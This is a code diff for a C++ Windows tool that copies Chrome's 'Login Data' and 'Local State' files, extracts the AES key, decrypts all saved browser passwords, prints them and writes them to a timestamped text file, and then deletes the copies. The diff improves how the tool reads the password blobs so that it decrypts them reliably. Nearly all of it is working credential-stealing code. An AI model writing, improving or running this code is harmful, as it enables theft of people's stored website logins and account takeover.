@@ -14,13 +14,16 @@
 #pragma comment(lib,"libcrypto.lib") //libcrypto-3.dll
 
 using namespace std;
-using json = nlohmann::json;
 
-string decrypt_password(string password, string & key) {
-    if (password.size() < 16) return "";
-    std::string iv = password.substr(3, 15);
-    std::string ciphertext = password.substr(15);
-    
+string key;
+string iv;
+string decrypt_password(char* password,int length) {
+    if (length < 16) return "";
+
+    string ciphertext(password, length);
+    iv = ciphertext.substr(3, 15);
+    ciphertext = ciphertext.substr(15);
+
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
     EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, nullptr);
     EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, (const unsigned char*)key.c_str(), (const unsigned char*)iv.c_str());
@@ -31,14 +34,14 @@ string decrypt_password(string password, string & key) {
 
     EVP_CIPHER_CTX_free(ctx);
 
-    ZeroMemory(outbuf + strlen(outbuf) - 16, 16);
+    ZeroMemory(outbuf + outlen - 16, 16);
 
     return outbuf;
 }
 
 string getKey(const char* path) {
     ifstream f(path);
-    string bin_key = base64_decode(json::parse(f)["os_crypt"]["encrypted_key"]);
+    string bin_key = base64_decode(nlohmann::json::parse(f)["os_crypt"]["encrypted_key"]);
     f.close();
     
     bin_key = bin_key.substr(5);
@@ -74,37 +77,47 @@ int main() {
     CopyFileA(Login_Data.c_str(), "Login Data", 0);
 
     //获取AES key
-    string key = getKey("Local State");
+    key = getKey("Local State");
 
     //读取Login Data
-    char** results;
-    int nrows, ncols;
-    char* errmsg = NULL;
     sqlite3* db = NULL;
-    sqlite3_open("Login Data", &db);
-    sqlite3_get_table(db, "select origin_url, action_url, username_value, password_value from logins order by date_last_used;", &results, &nrows, &ncols, &errmsg);
+    sqlite3_open_v2("Login Data", &db, SQLITE_OPEN_READONLY, 0);
+
+    sqlite3_stmt* stmt;
+    sqlite3_prepare_v2(db, "select origin_url, action_url, username_value, password_value from logins order by date_last_used desc;", -1, &stmt, NULL);
 
     //输出
     string outfile = "ChromePasswd-"+ to_string((unsigned)time(0)) + ".txt";
-    ofstream out(outfile);
+    ofstream fout(outfile);
 
-    string decrypt;
-    for (int i = 1; i <= nrows; i++) {
-        decrypt = decrypt_password(results[i * ncols + 3], key);
-        cout << "origin_url: " << results[i * ncols] << "\n";
-        cout << "action_url: " << results[i * ncols + 1] << "\n";
-        cout << "username_value: " << results[i * ncols + 2] << "\n";
-        cout << "password_value: " << decrypt << "\n\n";
+    string de;
+    while (sqlite3_step(stmt) == SQLITE_ROW) {
+        const unsigned char* a = sqlite3_column_text(stmt, 0);
+        const unsigned char* b = sqlite3_column_text(stmt, 1);
+        const unsigned char* c = sqlite3_column_text(stmt, 2);
 
-        out << "origin_url: " << results[i * ncols] << "\n";
-        out << "action_url: " << results[i * ncols + 1] << "\n";
-        out << "username_value: " << results[i * ncols + 2] << "\n";
-        out << "password_value: " << decrypt << "\n\n";
+        cout << "origin_url: " << a << "\n";
+        cout << "action_url: " << b << "\n";
+        cout << "username_value: " << c << "\n";
+
+        //read blob data then decrypt it
+        char* blob;
+        blob = (char*)sqlite3_column_blob(stmt, 3);
+        int blob_len;
+        blob_len = sqlite3_column_bytes(stmt, 3);
+
+        de = decrypt_password(blob, blob_len);
+
+        cout <<"password: "<< de <<"\n\n\n";
+
+        //write to file
+        fout << "origin_url: " << a << "\n";
+        fout << "action_url: " << b << "\n";
+        fout << "username_value: " << c << "\n";
+        fout << "username_value: " << de << "\n\n\n";
     }
-
-    sqlite3_free_table(results);
     sqlite3_close(db);
-    out.close();
+    fout.close();
 
     DeleteFileA("Local State");
     DeleteFileA("Login Data");
